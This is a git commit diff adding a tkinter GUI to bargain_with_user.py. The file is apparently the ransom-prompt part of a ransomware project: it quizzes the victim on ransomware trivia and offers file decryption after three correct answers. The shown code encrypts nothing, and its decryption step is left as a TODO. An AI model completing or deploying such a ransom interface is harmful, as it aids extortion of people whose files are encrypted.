8cd7c67ee2278b1bdb660c0422977b4ea41b5eef
tyreseGill <168314093+tyreseGill@users.noreply.github.com>
2024-11-04 20:29:05 -0800

    Updated to have a GUI interface
    Allows user three attempts answer questions correctly and have their data decrypted. Is not yet capable of performing this decryption process

--- bargain_with_user.py
+++ bargain_with_user.py
@@ -1,78 +1,107 @@
+from tkinter import *
+from PIL import Image, ImageTk
+
 
 # List of question-answer pairs to be prompted to a user
 qAndA = ({"What kind of cyber attack is this?": ("ransomware", )},
          {"When was the first recorded case of a ransomware attack?": 1989},
          {"How much was the largest ransomware payment ever made (in millions)?": ("75", "$75")})
 
-# Flag indicating whether the user satisfies the terms of the agreement to get their files decrypted
-ready_to_decrypt: bool = False
+# Sets up window containing an image
+window = Tk()
+window.title("Riddle me this...")
+image = Image.open("Popup.png")
+photo = ImageTk.PhotoImage(image)
+label = Label(window, image=photo)
+label.pack()
+window.geometry("572x550")
 
-def askQuestion():
-    """A generator function to iterate through all the questions one at time. If a user answers incorrectly,
-    user has to restart until they use up all their attempts.
-    :return None"""
+# Sets up icon image
+icon_image = ImageTk.PhotoImage(file="icon.png")
+window.iconphoto(False, icon_image)
 
-    numCorrect: int = 0
+def clickingSubmit():
+    """The command to be run when the user clicks the Submit button on the GUI. Each time it is clicked,
+    it compares the user's input with the valid answers for each question and reduces the number of attempts
+    left. Drives the program to either (1) decrypt a users files if they answer all the questions correctly
+    or (2) close out and not do anything if a user exhausts their attempts."""
+    num_correct: int = 0
 
-    # Iterates through each Q-A pair in the list of questions and answers above
-    for question_answer_pair in qAndA:
-        # Unpacks the key-value pairs into question and answer variables
-        for question, answer in question_answer_pair.items():
-            # Prints the question to be answered and pauses the program until the user inputs a response
-            user_response: str = yield question
-            correct: bool
+    # Iterates through each response entry and checks if it aligns with the expected answer
+    for index, response in enumerate(response_entries):
+        # Retrieves the corresponding user response and answer to a particular question
+        response = response_entries[index].get()
+        correct_answer = answers[index]
 
-            # Checks if the answer is expected to be an integer or have multiple formats (can be an int or str)
-            # and determines whether a user's response correctly answers the question or not
-            if isinstance(answer, int):
-                yield answer
-                correct = (int(user_response) == answer)
-            else:
-                yield answer
-                correct = (user_response.lower() in answer)
+        # Checks if the user neglected to fill in one of the entries
+        if response == "":
+            print("Incorrect")
+            break
 
-            if correct:
-                print("Correct!")
-                numCorrect += 1
-                # Updates the flag to tell the program that the user has met the requirements to have their
-                # files decrypted
-                if numCorrect == len(qAndA):
-                    print("You win! Decrypting your files now...")
-                    global ready_to_decrypt
-                    ready_to_decrypt = True
-                    return
-            else:
-                print("Incorrect.")
-                return
+        # Determines the format for evaluating if a response is correct based on whether it's fixed (an int)
+        # or not fixed (has multiple values in the form of a string)
+        if isinstance(correct_answer, int):
+            correct = (int(response) == correct_answer)
+        else:
+            correct = (response.lower() in correct_answer)
+
+        if correct:
+            print("Correct!")
+            num_correct += 1
+            # Updates the flag to tell the program that the user has met the requirements to have their
+            # files decrypted
+            if num_correct == len(qAndA):
+                print("You win! Decrypting your files now...")
+                # Closes out the window and decrypts the user's files
+                window.destroy()
+                # TODO: Should execute the script to decrypt the encrypted files
+        else:
+            print("Incorrect.")
+            break
+
+    # Allows the program to decrement the variable "attempts_left" at the global level
+    global attempts_left
+    attempts_left -= 1
+
+    # Updates the label displaying the number of attempts left
+    attempt_label.config(text=f"Attempts Left: {attempts_left}")
+
+    # Exits out of program when user exhausts their attempts
+    if attempts_left == 0:
+        print("You ran out of attempts! Good luck decrypting your files!")
+        window.destroy()
 
 
-def main():
-    num_attempts: int = 1
-    attempts_left: int = 3
+# Initializes the number of user attempts to be 3
+attempts_left: int = 3
 
-    # Displays the questions for each attempt until the user either exhausts their attempts or satisfies the
-    # conditions for decryption
-    while attempts_left != 0 and ready_to_decrypt is False:
-        print("**** Attempt", num_attempts, "****")
+# Displays the number of attempts a user has remaining
+attempt_label = Label(window, text=f"Attempts Left: {attempts_left}", font=('Arial', 10, 'bold'))
+attempt_label.pack(pady=2)
 
-        # Creates a generator object
-        questions = askQuestion()
+# Stores reference to the entries and labels displayed
+response_entries = []
+answers = []
 
-        # Goes through one question at a time and compares the user's response
-        for question in questions:
-            user_response = input(question + " ")
-            # Only until after the user inputs a response, the program unpauses execution and sends the user's
-            # response back to the generator
-            questions.send(user_response)
+# Iterates through each individual question-answer pair in qAndA
+for question_answer_pair in qAndA:
+    # Unpacks the key-value pair from question_answer_pair as the question and answer respectively
+    for question, answer in question_answer_pair.items():
+        # Displays a question from the dictionary variable "question_answer_pair"
+        question_label = Label(window, text=question, font=('Arial', 10, 'bold'))
+        question_label.pack(pady=2)
 
-        # TODO: Should execute the script to decrypt the encrypted files
-        if ready_to_decrypt is True:
-            print("Begin Decryption!")
+        # Create and pack the entry for each answer
+        response_entry = Entry(window, width=30)
+        response_entry.pack(pady=5)
 
-        num_attempts += 1
-        attempts_left -= 1
+        # Adds each
+        answers.append(answer)
+        response_entries.append(response_entry)
 
-        if attempts_left == 0:
-            print("You ran out of attempts! Good luck decrypting your files!")
+# Creates a button for the user to interact with in the GUI
+submit_button = Button(window, text="Submit", command=clickingSubmit)
+submit_button.pack()
 
-main()
+# Used to keep window open and reactive to any events (i.e. clicking the submit button)
+window.mainloop()
